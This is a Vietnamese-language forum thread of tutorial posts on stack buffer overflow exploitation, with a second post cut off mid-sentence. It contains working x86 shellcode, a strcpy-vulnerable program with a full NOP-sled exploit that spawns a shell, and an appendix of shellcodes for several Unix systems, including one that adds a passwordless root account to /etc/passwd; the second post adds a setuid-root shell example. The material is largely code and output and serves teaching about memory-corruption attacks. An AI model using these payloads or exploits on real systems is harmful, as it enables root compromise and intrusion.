~/vicki]$<br/> Nó đã làm việc! Tuy nhiên có một vấn đề lớn trong shellcode đầu tiên. Shellcode này có chứa \x00. Chúng ta sẽ thất bại nếu dùng shellcode này để làm tràn bộ đệm. Vì sao? Hàm strcpy() sẽ chấm dứt copy khi gặp \x00 nên shellcode sẽ không được copy trọn vẹn vào buffer! Chúng ta cần gở bỏ hết \x00 trong shellcode:<br/> <br/> Câu lệnh gặp vấn đề: Được thay thế bằng:<br/> --------------------------------------------------------<br/> movb $0x0,0x7(%esi) xorl %eax,%eax<br/> molv $0x0,0xc(%esi) movb %eax,0x7(%esi)<br/> movl %eax,0xc(%esi)<br/> --------------------------------------------------------<br/> movl $0xb,%eax movb $0xb,%al<br/> --------------------------------------------------------<br/> movl $0x1, %eax xorl %ebx,%ebx<br/> movl $0x0, %ebx movl %ebx,%eax<br/> inc %eax<br/> --------------------------------------------------------<br/> Shellcode mới!<br/> <br/> shellcodeasm2.c<br/> ------------------------------------------------------------------------------<br/> void main() {<br/> __asm__("<br/> jmp 0x1f # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> xorl %eax,%eax # 2 bytes<br/> movb %eax,0x7(%esi) # 3 bytes<br/> movl %eax,0xc(%esi) # 3 bytes<br/> movb $0xb,%al # 2 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> xorl %ebx,%ebx # 2 bytes<br/> movl %ebx,%eax # 2 bytes<br/> inc %eax # 1 bytes<br/> int $0x80 # 2 bytes<br/> call -0x24 # 5 bytes<br/> .string \"/bin/sh\" # 8 bytes<br/> # 46 bytes total<br/> ");<br/> }<br/> ------------------------------------------------------------------------------<br/> Test shellcode mới!<br/> <br/> testsc2.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> void main() {<br/> int *ret;<br/> <br/> ret = (int *)&ret + 2;<br/> (*ret) = (int)shellcode;<br/> <br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o testsc2 testsc2.c<br/> [đt@localhost ~/vicki]$ ./testsc2<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> Viết tràn bộ đệm<br/> <br/> Ví dụ 1:<br/> <br/> overflow.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> char large_string[128];<br/> <br/> void main() {<br/> char buffer[96];<br/> int i;<br/> long *long_ptr = (long *) large_string;<br/> <br/> for (i = 0; i &lt; 32; i++)<br/> *(long_ptr + i) = (int) buffer;<br/> <br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> large_string[i] = shellcode[i];<br/> <br/> strcpy(buffer,large_string);<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o overflow overflow.c<br/> [đt@localhost ~/vicki]$ ./overflow<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> * Giải thích:<br/> <br/> đỉnh của +--------------+ đáy của +----------------+ đỉnh của<br/> bộ nhớ | ret addr | stack | addr(buffer) | bộ nhớ <br/> +--------------+ | addr(buffer) |<br/> | ebp | | ... |<br/> +--------------+ | addr(buffer) |<br/> | | | addr(buffer) | large_string[128]<br/> | buffer[96] | | addr(buffer) |<br/> | | | |<br/> +--------------+ | shellcode | <br/> | long_ptr | --------------&gt; | |<br/> đáy của +--------------+ đỉnh của +----------------+ đáy của<br/> bộ nhớ stack bộ nhớ<br/> <br/> STACK HEAP<br/> char large_string[128]; //cấp phát một vùng nhớ 128 bytes trên HEAP<br/> <br/> long *long_ptr = (long *) large_string; // cho long_ptr trỏ đến đầu mảng large_string[]<br/> <br/> for (i=0; i&lt;32; i++)<br/> *(long_ptr+i) = (int)buffer; //lắp đầy mảng large_string[] bằng địa chỉ của mảng buffer[]<br/> <br/> for (i=0; i&lt;strlen(shellcode); i++)<br/> large_string[i] = shellcode[i]; //đẩy shellcode vào phần đầu của mảng large_string[]<br/> <br/> strcpy(buffer, large_string); //copy large_string vào buffer... làm tràn bộ đệm<br/> <br/> Trước hết chúng ta khởi tạo một mảng large_string[] có kích thước lớn hơn buffer[] trên HEAP. Tiếp theo lắp đầy large_string[] bằng địa chỉ của buffer[]. Shellcode sẽ được gắn vào phần đầu của large_string[]. Khi hàm strcpy được thực hiện, nó sẽ copy large_string vào buffer. Bởi vì large_string quá lớn nên nó sẽ ghi đè lên ebp và return addr. Phần trên của mảng large_string toàn là địa chỉ của buffer[] - addr(buffer) nên return addr sẽ trỏ đến buffer[0]. Mà nằm ngay ở phần đầu của buffer lại chính là shellcode(do ta đã copy large_string vào buffer bằng hàm strcpy), nên shellcode sẽ được thi hành, nó sẽ đổ ra một shell lệnh.<br/> <br/> Ví dụ 2:<br/> <br/> Để viết tràn bộ đệm, bạn phải biến địa chỉ của buffer trên stack. Thật may cho chúng ta là hầu như tất cả các chương trình đều có cùng địa chỉ bắt đầu stack. Chúng ta có thể lấy được địa chỉ bắt đầu của stack qua chương trình sau:<br/> <br/> sp.c<br/> ------------------------------------------------------------------------------<br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> void main() {<br/> printf("0x%x\n", get_sp());<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o sp sp.c<br/> [đt@localhost ~/vicki]$ ./sp<br/> 0xbffffb07<br/> [đt@localhost ~/vicki]$<br/> Giả sử chương trình mà chúng ta cố làm tràn bộ đệm như sau:<br/> <br/> vulnerable.c<br/> ----------------------------------------------<br/> int main(int argc, char *argv[])<br/> { <br/> char buffer[500];<br/> if(argc&gt;=2) strcpy(buffer, argv[1]);<br/> return 0;<br/> }<br/> ----------------------------------------------<br/> Đây là chương trình exploit.c. exploit sẽ làm tràn bộ đệm của vulnerable và buộc vulnerable đổ một shell lệnh cho chúng ta.<br/> <br/> exploit.c<br/> ------------------------------------------------------------------------------<br/> #include &lt;stdlib.h&gt;<br/> #define BUFFERSIZE 600<br/> #define OFFSET 0<br/> #define NOP 0x90<br/> <br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> unsigned long get_esp(void)<br/> {<br/> __asm__("movl %esp, %eax");<br/> }<br/> <br/> int main(int argc, char *argv[])<br/> {<br/> int i, offset=OFFSET, bsize=BUFFERSIZE;<br/> long esp, ret, *addr_ptr;<br/> char *buffer, *ptr, *osptr;<br/> <br/> if (argc&gt;1) bsize=atoi(argv[1]);<br/> if (argc&gt;2) offset=atoi(argv[2]);<br/> <br/> esp=get_esp();<br/> ret=esp-offset;<br/> <br/> printf("Stack pointer: 0x%x\n",esp);<br/> printf("Offset : 0x%x\n",offset);<br/> printf("Return addr : 0x%x\n",ret);<br/> <br/> if (!(buffer=malloc(bsize)))<br/> {<br/> printf("Khong the cap phat bo nho.\n");<br/> exit(-1);<br/> }<br/> <br/> ptr=buffer;<br/> addr_ptr=(long *)ptr;<br/> for (i=0;i&lt;bsize;i+=4)<br/> *(addr_ptr++)=ret;<br/> <br/> for (i=0;i&lt;bsize/2;i++)<br/> buffer[i]=NOP;<br/> <br/> ptr=buffer+((bsize/2)-(strlen(shellcode)/2));<br/> for (i=0;i&lt;strlen(shellcode);i++)<br/> *(ptr++)=shellcode[i];<br/> <br/> buffer[bsize-1]=0;<br/> execl("./vulnerable","vulnerable",buffer,0);<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o vulnerable vulnerable.c<br/> [đt@localhost ~/vicki]$ cc -o exploit exploit.c<br/> [đt@localhost ~/vicki]$ ./exploit<br/> Stack pointer: 0xbffffaf8<br/> Offset : 0x0<br/> Return addr : 0xbffffaf8<br/> <br/> sh-2.04$<br/> Giải thích:<br/> <br/> Trước hết, chúng ta cần xác định địa chỉ trở về khi tràn bộ đệm.<br/> <br/> esp=get_esp();<br/> ret=esp-offset; <br/> <br/> Địa chỉ trở về khi tràn bộ đệm = ESP(địa chỉ bắt đầu của stack) - OFFSET . Tại sao phải trừ cho offset? Bởi vì chúng ta có gọi hàm execl("./vulnerable","vulnerable",buffer,0); sau cùng, nên ESP lúc này sẽ bị trừ đi một số bytes do chương trình exploit có sử dụng một số bytes trên stack cho các tham số và biến cục bộ của hàm.Điều này sẽ tăng khả năng địa chỉ trở về trỏ đến một nơi nào đó trong buffer[] của vulnerable, nơi mà chúng ta sẽ đặt NOPs và shellcode. <br/> <br/> Quan sát stack: <br/> <br/> +---------------+<br/> | argv[] & argc |<br/> | của exploit |<br/> +---------------+<br/> | return addr 1 |<br/> +---------------+<br/> | ebp 1 |<br/> +---------------+<br/> | |<br/> | các biến cục |<br/> | bộ của exploit|<br/> | |<br/> +---------------+<br/> | argv[] & argc |<br/> | của exploit |<br/> +---------------+<br/> | return addr 2 | ----\<br/> +---------------+ |<br/> | ebp 2 | |<br/> +---------------+ |<br/> | | |<br/> | buffer[] của | |<br/> | vulnerable | &lt;---/<br/> | |<br/> +---------------+<br/> Chúng ta cần làm tràn buffer[] của vulnerable để return addr 2 trỏ đến đâu đó trong buffer[]. Cũng như ví dụ 1- overflow.c(bạn hãy xem lại thật kĩ ví dụ 1), chúng ta sẽ tạo một vùng nhớ trên heap:<br/> <br/> if (!(buffer=malloc(bsize)))<br/> {<br/> printf("Khong the cap phat bo nho.\n");<br/> exit(-1);<br/> }<br/> Bây giờ lắp đầy buffer bằng địa chỉ trở về mà chúng ta đã tính được:<br/> <br/> ptr=buffer;<br/> addr_ptr=(long *)ptr;<br/> for (i=0;i&lt;bsize;i+=4)<br/> *(addr_ptr++)=ret;<br/> Tiếp theo chúng ta sẽ lắp đầy 1/2 buffer bằng NOPs<br/> <br/> for (i=0;i&lt;bsize/2;i++)<br/> buffer[i]=NOP;<br/> Sau đó, chúng ta đặt shellcode vào giữa NOPs<br/> <br/> ptr=buffer+((bsize/2)-(strlen(shellcode)/2));<br/> for (i=0;i&lt;strlen(shellcode);i++)<br/> *(ptr++)=shellcode[i];<br/> Cuối cùng đặt '\0' vào buffer để hàm strcpy() trong vulnerable biết đã hết data cần copy.<br/> <br/> buffer[bsize-1]=0;<br/> Tiến hành làm tràn bộ đệm của vulnerable, bạn sẽ có được shell lệnh do vulnerable spawn.<br/> <br/> execl("./vulnerable","vulnerable",buffer,0);<br/> Quan sát stack, buffer[] của vulnerable và return addr 2 sau khi tràn bộ đệm sẽ có dạng như sau:<br/> <br/> +------------+<br/> |return addr2| -----\<br/> +------------+ |<br/> | ebp 2 | |<br/> +------------+ |<br/> | ... | |<br/> | nop | |<br/> | ... | |<br/> | shellcode | |<br/> | ... | |<br/> | nop | |<br/> | nop | &lt;----/<br/> | nop |<br/> | ... |<br/> +------------+<br/> Chúng ta hi vọng rằng return addr 2 sẽ trỏ đến 1 nop trước shellcode. Các câu lệnh NOPs sẽ không làm gì hết, đến khi gặp shellcode, shellcode sẽ đổ shell lệnh cho chúng ta(bạn hãy xem lại phần "Hình dung cách đặt shellcode trên stack).<br/> <br/> Phụ lục<br/> <br/> Các loại shellcode<br/> <br/> BSDi<br/> <br/> char code[] =<br/> "\xeb\x57\x5e\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e"<br/> "\x26\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8\x31"<br/> "\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2\x31\xc0\x88"<br/> "\x46\x0b\x89\xf3\x83\xc0\x05\x31\xc9\x83\xc1\x01\x31"<br/> "\xd2\xcd\x80\x89\xc3\x31\xc0\x83\xc0\x04\x31\xd2\x88"<br/> "\x56\x27\x89\xf1\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31"<br/> "\xc0\x83\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"<br/> "BIN/SH";<br/> <br/> FreeBSD<br/> <br/> char code[]=<br/> "\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76"<br/> "\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b"<br/> "\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff"<br/> "\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff"<br/> "\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02"<br/> "\x02\x02\x02/bin/sh.-c.sh";<br/> <br/> Replace .sh with .anycommand<br/> <br/> Linux x86<br/> <br/> char shellcode[] =<br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/> <br/> OpenBSD<br/> <br/> OpenBSD shellcode that adds an unpassworded root login<br/> "w00w00" to /etc/passwd... Courtesy of w00w00.<br/> (Changed from /tmp/passwd to /etc/passwd... give kiddies a chance <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/> <br/> char shell[]=<br/> "\xeb\x2b\x5e\x31\xc0\x88\x46\x0b"<br/> "\x88\x46\x29\x50\xb0\x09\x50\x31"<br/> "\xc0\x56\x50\xb0\x05\xcd\x80\x89"<br/> "\xc3\x6a\x1d\x8d\x46\x0c\x50\x53"<br/> "\x50\x31\xc0\xb0\x04\xcd\x80\x31"<br/> "\xc0\xb0\x01\xcd\x80\xe8\xd0\xff"<br/> "\xff\xff\x2f\x65\x74\x63\x2f\x70"<br/> "\x61\x73\x73\x77\x64\x30\x77\x30"<br/> "\x30\x77\x30\x30\x3a\x3a\x30\x3a"<br/> "\x30\x3a\x77\x30\x30\x77\x30\x30"<br/> "\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f"<br/> "\x73\x68\x0a\x30\xff\xff\xff\xff"<br/> "\xff\xff\xff\xff\xff\xff\xff\xff"<br/> "\xff\xff\xff\xff\xff\xff\xff\xff";<br/> <br/> Solaris / Sparc<br/> <br/> char c0de[] =<br/> /* setreuid() */<br/> "\x82\x10\x20\xca" /* mov 0xca, %g1 */<br/> "\x92\x1a\x40\x09" /* xor %o1, %o1, %o1 */<br/> "\x90\x0a\x40\x09" /* and %o1, %o1, %o0 */<br/> "\x91\xd0\x20\x08" /* ta 8 */<br/> "\x2d\x0b\xd8\x9a" /* sethi $0xbd89a, %l6 */<br/> "\xac\x15\xa1\x6e" /* or %l6, 0x16e, %l6 */<br/> "\x2f\x0b\xdc\xda" /* sethi $0xbdcda, %l7 */<br/> "\x90\x0b\x80\x0e" /* and %sp, %sp, %o0 */<br/> "\x92\x03\xa0\x08" /* add %sp, 8, %o1 */<br/> "\x94\x1a\x80\x0a" /* xor %o2, %o2, %o2 */<br/> "\x9c\x03\xa0\x10" /* add %sp, 0x10, %sp */<br/> "\xec\x3b\xbf\xf0" /* std %l6, [%sp - 0x10] */<br/> "\xdc\x23\xbf\xf8" /* st %sp, [%sp - 0x08] */<br/> "\xc0\x23\xbf\xfc" /* st %g0, [%sp - 0x04] */<br/> "\x82\x10\x20\x3b" /* mov $0x3b, %g1 */<br/> "\x91\xd0\x20\x08" /* ta 8 <br/> <br/> Solaris / x86<br/> <br/> char c0de[] = <br/> <br/> "\xeb\x0a" /* jmp initcall */<br/> "\x9a\x01\x02\x03\x5c\x07\x04" /* lcall */<br/> "\xc3" /* ret */<br/> "\xeb\x05" /* jmp setuidcode */<br/> "\xe8\xf9\xff\xff\xff" /* call jmpz */<br/> "\x5e" /* popl %esi */<br/> "\x29\xc0" /* subl %eax, %eax */<br/> "\x88\x46\xf7" /* movb %al, 0xfffffff7(%esi) */<br/> "\x89\x46\xf2" /* movl %eax, 0xfffffff2(%esi) */<br/> "\x50" /* pushl %eax */<br/> "\xb0\x8d" /* movb $0x8d, %al */<br/> "\xe8\xe0\xff\xff\xff" /* call initlcall */<br/> "\x29\xc0" /* subl %eax, %eax */<br/> "\x50" /* pushl %eax */<br/> "\xb0\x17" /* movb $0x17, %al */<br/> "\xe8\xd6\xff\xff\xff" /* call initlcall */<br/> "\xeb\x1f" /* jmp callz */<br/> "\x5e" /* popl %esi */<br/> "\x8d\x1e" /* leal (%esi), %ebx */<br/> "\x89\x5e\x0b" /* movl %ebx, 0x0b(%esi) */<br/> "\x29\xc0" /* subl %eax, %eax */<br/> "\x88\x46\x19" /* movb %al, 0x19(%esi) */<br/> "\x89\x46\x14" /* movl %eax, 0x14(%esi) */<br/> "\x89\x46\x0f" /* movl %eax, 0x0f(%esi) */<br/> "\x89\x46\x07" /* movl %eax, 0x07(%esi) */<br/> "\xb0\x3b" /* movb $0x3b, %al */<br/> "\x8d\x4e\x0b" /* leal 0x0b(%esi), %ecx */<br/> "\x51" /* pushl %ecx */<br/> "\x51" /* pushl %ecx */<br/> "\x53" /* pushl %ebx */<br/> "\x50" /* pushl %eax */<br/> "\xeb\x18" /* jmp lcall */<br/> "\xe8\xdc\xff\xff\xff" /* call start */<br/> "\x2f\x62\x69\x6e\x2f\x73\x68" /* /bin/sh */<br/> "\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"<br/> "\x9a\x04\x04\x04\x04\x07\x04"; /* lcall */<br/> <br/> Công cụ tạo shellcode "Hellkit"<br/> <br/> Hellkit là một công cụ dùng tạo shellcode cho Linux rất dễ dùng. Hellkit rất đa năng, đặc biệt Hellkit còn cho phép tạo shellcode có kích thước lên đến 65535 bytes!<br/> <br/> Tài liệu tham khảo<br/> <br/> "Smashing The Stack For Fun And Profit"(phrack 49-14) - Aleph One<br/> "Advanced buffer overflow exploits" - Taeho Oh <br/> <br/> Do hiểu biết còn nhiều hạn chế nên bài viết này không tránh khỏi những thiếu xót, rất mong nhận được sự đóng góp, giúp đỡ của các bạn để bài viết được hoàn thiện hơn. Thanks</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#FF3333">[Article]</font></span>&nbsp;&nbsp; Tìm hiểu đầy đủ về tràn bộ đệm - III<a name="1113" id="1113"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">27/06/2006 03:22:24 (+0700) | <a href="/hvaonline/posts/list/430.hva#1113">#3</a> | 1113 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/111217.hva"><b>hmnm</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 04/07/2005 10:32:09<br>
		Messages: 17<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/111217.hva" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/111217.hva" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Tác giả: dientinh<br/> <br/> <b><font color='yellow'>Khai thác lỗi tràn bộ đệm</font></b><br/> <br/> <font color='yellow'>1. Quyền root và chương trình setuid/setgid</font><br/> Trên các hệ điều hành đa người dùng nói chung và UNIX nói riêng, thiết kế truyền thống cho phép user root (superuser) có quyền tối cao có thể thực hiện mọi thao tác trên hệ thống. Hơn nữa, có một số thao tác đòi hỏi buộc phải có quyền root mới có thể thực hiện được, ví dụ thay đổi mật khẩu (phải cập nhật file /etc/passwd). Để người dùng bình thường có thể thực hiện được các thao tác này, hệ thống UNIX cung cấp một cơ chế thiết lập quyền thực tế của tiến trình đang thực thi thông qua các hàm thiết lập quyền như setuid()/setgid(), seteuid()/setegid(), setruid()/setrgid(). Quyền thực tế sẽ được hệ thống tự động thiết lập thông qua bit thuộc tính suid/sgid của file chương trình. Ví dụ chương trình passwd được suid root:<br/> <br/> -r-s--x--x 1 root root 12244 Feb 8 2000 /usr/bin/passwd<br/> <br/> Khi user bình thường thực thi chương trình, quyền thực tế có được sẽ là quyền của người sở hữu (owner) file, ở đây là root. Do yêu cầu sử dụng, trên hệ thống UNIX thường có nhiều file chương trình được thiết lập thuộc tính suid (cho owner, group). Ví dụ sau sẽ minh hoạ rõ hơn điều này:<br/> <br/> /* suidsh.c */<br/> void main() {<br/> setuid(0);<br/> system("/bin/sh");<br/> }<br/> <br/> [SkZ0@gamma bof]$ gcc -o suidsh suidsh.c<br/> [SkZ0@gamma bof]$ su<br/> Password: <br/> # chown root.root suidsh<br/> # chmod 4755 suidsh<br/> # exit<br/> [SkZ0@gamma bof]$ ls -l suidsh<br/> -rwsr-xr-x 1 root root 13637 Mar 26 15:54 suidsh<br/> [SkZ0@gamma bof]$ id<br/> uid=501(SkZ0) gid=501(SkZ0) groups=501(SkZ0)<br/> [SkZ0@gamma bof]$ ./suidsh<br/> bash# id<br/> uid=0(root) gid=501(SkZ0) groups=501(SkZ0)<br/> <br/> Có thể thấy, nếu chương trình suid/sgid bị lỗi bảo mật, hacker sẽ tận dụng điều này để điều khiển chương trình thực hiện mã lệnh bất kỳ trên hệ thống với quyền cao hơn và thậm chí với quyền cao nhất root. Đó chính là mục đích của việc khai thác các lỗ hổng bảo mật trên máy tại chỗ (local).<br/> <br/> <font color='yellow'>2. Chương trình bị tràn bộ đệm</font><br/> Để minh hoạ cách tổ chức và chèn shellcode vào chương trình bị lỗi, ta sẽ sửa lại một chút chương trình vuln.c đã ví dụ ở phần 1:<br/> <br/> /* vuln1.c */<br/> int main(int argc, char **argv)<br/> {<br/> char buf[500];<br/> if (argc&gt;1) {<br/> strcpy(buf, argv[1]);<br/> printf("%s\n", buf);<br/> }<br/> }<br/> <br/> Kích thước của bộ đệm buf là 500 byte. Từ những trình bày ở phần trước, để khai thác lỗi tràn bộ đệm trong chương trình vuln1.c chúng ta chỉ cần ghi đè giá trị của "con trỏ lệnh bảo lưu" (saved instruction pointer) được lưu trên stack bằng địa chỉ mã lệnh mong muốn, ở đây chính là địa chỉ bắt đầu của shellcode. Như vậy chúng ta cần phải sắp xếp shellcode ở đâu đó trên bộ nhớ stack và xác định địa chỉ bắt đầu của nó.<br/> <br/> <br/> <font color='yellow'>3. Tổ chức shellcode trên bộ nhớ</font><br/> Vấn đề của việc tổ chức shellcode trên bộ nhớ là làm thế nào để chương trình khai thác lỗi có thể xác định được địa chỉ bắt đầu của bộ đệm chứa shellcode bên trong chương trình bị lỗi. Thông thường, ta không thể biết một cách chính xác địa chỉ của bộ đệm trong chương trình bị lỗi (phụ thuộc vào biến môi trường, tham số khi thực thi), do đó ta sẽ xác định một cách gần đúng. Điều này có nghĩa chúng ta phải tổ chức bộ đệm chứa shellcode sao cho khi bắt đầu ở một địa chỉ có thể lệch so với địa chỉ chính xác mà shellcode vẫn thực thi không hề bị ảnh hưởng. Lệnh máy NOP (No OPeration) giúp ta đạt được điều này. Khi gặp một lệnh NOP, CPU sẽ không làm gì cả ngoài việc tăng con trỏ lệnh đến lệnh kế tiếp.<br/> <br/> Như vậy, chúng ta sẽ lấp đầy phần đầu của bộ đệm bằng các lệnh NOP, kế đó là shellcode. Hơn nữa, để không phải tính toán chính xác vị trí lưu con trỏ lệnh bảo lưu trên stack, chúng ta sẽ chỉ đặt shellcode ở khoảng giữa của bộ đệm, phần còn lại sẽ chứa toàn các giá trị địa chỉ bắt đầu của shellcode. Cuối cùng, bộ đệm chứa shellcode sẽ có dạng:<br/> <br/> Hình 1: Tổ chức shellcode trên bộ nhớ <br/> <br/> Hình sau mô tả trạng thái của stack trước và sau khi tràn bộ đệm xảy ra.<br/> <br/> Hình 2: Trạng thái stack trước và sau khi tràn bộ đệm <br/> Before After <br/> <br/> Có một vấn đề cũng cấn lưu ý ở đây là sự sắp xếp (alignment) biến trên stack. Giá trị địa chỉ có độ dài 4 byte (32 bit), vì vậy khi được sắp vào stack không phải lúc nào cũng chính xác như mong muốn. Ở phần trước chúng ta đã biết stack sử dụng đơn vị là word có độ dài 4 byte, do đó độ lệch do sắp không đúng sẽ là 1, 2 hoặc 3 byte.<br/> <br/> Hình 3: Các khả năng sắp xếp biến trên stack <br/> <br/> Chỉ có một trường hợp sắp xếp đúng sẽ làm việc, các trường hợp khác sẽ dẫn đến báo lỗi "segmentation violation" hoặc "illegal instruction", tuy nhiên chúng ta có thể sử dụng phương pháp "thử và sai" để tìm được sự sắp xếp đúng trong bộ nhớ không mấy khó khăn.<br/> <br/> <br/> <font color='yellow'>4. Xác định địa chỉ shellcode</font><br/> Vấn đề quan trọng nhất là làm thế nào để "đoán trước" được địa chỉ bắt đầu của bộ đệm chứa shellcode bên trong chương trình bị lỗi. Nhờ cách tổ chức shellcode với các NOP ở trên, địa chỉ này chỉ cần gần đúng sao cho rơi vào khoảng giữa các lệnh NOP trên bộ đệm shellcode.<br/> <br/> Một điểm đặc biệt là mọi chương trình khi thực thi đều có địa chỉ bắt đầu stack như nhau (lưu ý: trên không gian địa chỉ ảo. Ví dụ: giá trị này trên Linux là 0xbfffffff, trên FreeBSD là 0xbfbfffff) và thường các chương trình ít khi push vào stack ngay một lúc vài ngàn byte. Do đó, ta có thể đoán được địa chỉ bắt đầu của bộ đệm chứa shellcode trên stack trong chương trình bị lỗi dựa vào độ lệch so với địa chỉ đỉnh stack hiện tại của chương trình khai thác lỗi. Độ lệch này có thể mang giá trị âm hoặc giá trị dương (xem lại phần 1).<br/> <br/> Đoạn chương trình sau sẽ in ra giá trị của con trỏ stack SP:<br/> <br/> /* sp.c */<br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> <br/> void main() {<br/> printf("0x%x\n", get_sp());<br/> }<br/> <br/> [SkZ0@gamma bof]$ gcc -o sp sp.c<br/> [SkZ0@gamma bof]$ ./sp<br/> 0xbffffa50<br/> [SkZ0@gamma bof]$<br/> <br/> Địa chỉ gần đúng của bộ đệm chứa shellcode sẽ được xác định theo công thức:<br/> <br/> SP +(-) OFFSET<br/> <br/> <br/> <font color='yellow'>5. Viết chương trình khai thác lỗi tràn bộ đệm</font><br/> Chúng ta đã biết những gì cần thiết để khai thác lỗi tràn bộ đệm, bây 